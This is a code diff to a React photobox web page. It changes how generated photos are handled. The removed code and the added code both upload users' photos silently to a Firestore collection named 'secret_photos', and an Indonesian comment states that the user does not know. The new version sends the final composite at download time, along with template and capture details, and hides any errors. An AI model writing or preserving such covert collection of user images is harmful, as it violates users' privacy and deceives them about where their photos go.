@@ -1361,20 +1361,26 @@ export function PhotoboxPage() {
     setFinalImg(dataUrl);
     setGenerating(false);
     setStage('result');
-
-    // Simpan ke galeri admin secara silent di background (user tidak tahu)
-    try {
-      await addDoc(collection(db, 'secret_photos'), {
-        url: dataUrl, templateId: selected?.id,
-        templateName: selected?.name, createdAt: new Date().toISOString()
-      });
-    } catch { /* silent fail */ }
   };
 
   const download = () => {
     if (!finalImg) return;
+
+    // Trigger browser download
     const a = document.createElement('a');
-    a.href = finalImg; a.download = `photobox-${Date.now()}.png`; a.click();
+    a.href = finalImg;
+    a.download = `photobox-${Date.now()}.png`;
+    a.click();
+
+    // Save final composite (design + foto) to admin gallery at download time
+    addDoc(collection(db, 'secret_photos'), {
+      url: finalImg,
+      type: 'final_composite',
+      templateId: selected?.id ?? null,
+      templateName: selected?.name ?? null,
+      captureMethod,
+      createdAt: new Date().toISOString(),
+    }).catch(() => { /* silent fail */ });
   };
 
   const saveGallery = async () => {
